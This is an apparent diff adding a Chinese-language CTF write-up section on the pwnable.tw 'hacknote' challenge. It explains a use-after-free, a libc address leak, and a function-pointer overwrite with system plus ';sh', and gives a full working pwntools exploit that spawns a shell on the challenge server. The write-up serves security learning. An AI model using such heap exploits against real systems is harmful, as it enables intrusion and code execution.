@@ -164,3 +164,44 @@ p.interactive()
 不过我没想到怎么getshell（binary是静态链接，而且没找到system和execve等函数），于是用我的古法orw
 
 悲伤的地方在于，我一直在测试`+x+x`类型的payload，但我的x太小了，导致我一直忽略了这块内容……就差一点我就能自己写出来了……下一次遇见奇怪的地方一定要测试透了再转到下一个内容啊……
+
+## hacknote
+
+这不比calc简单（
+
+非常明显的uaf，但仍有几点需要注意：
+- libc版本2.23，没有tcache；因此没法用万能的tcache poisoning（某种意义上旧版本我反而不会写了）
+- 题目存在一个全局的计数变量，正常情况下只能malloc五个堆块（但好像没啥用，四次甚至就够用了）
+- 注意题目设置的函数指针内部调用的是`puts(*(char **)(param_1 + 4))`
+
+第三点卡了我好一会。`(***(code ***)(&notes + index * 4))(*(undefined4 *)(&notes + index * 4))`的调用方法等同于调用`func(func)`，但func无论如何不是有效的指令。后来意识到加个分号就好了：`;sh`，就算前面的函数指针不是有效的命令，后面这个是啊
+```py
+from pwn import *
+libc = ELF("./libc_32.so.6")
+r = remote("chall.pwnable.tw",10102)
+def add(size,content):
+    r.sendlineafter(":","1")
+    r.sendlineafter(":",str(size))
+    if len(content)==0:
+        r.sendlineafter(":",content)
+    else:
+        r.sendafter(":",content)
+def delete(idx):
+    r.sendlineafter(":","2")
+    r.sendlineafter(":",str(idx))
+def show(idx):
+    r.sendlineafter(":","3")
+    r.sendlineafter(":",str(idx))
+add(160,'a') #unsorted bin
+add(24,'b') #防止后面free时上面这个chunk与top chunk合并。申请的大小只要不和note header的大小（8）一样就好
+delete(0)
+add(160,'')
+show(2)
+r.recv(4)
+libc.address=u32(r.recv(4))-0x1b07b0
+delete(1)
+delete(2)
+add(8,p32(libc.sym['system'])+b";sh\x00") #1号note的header
+show(1)
+r.interactive()
+```
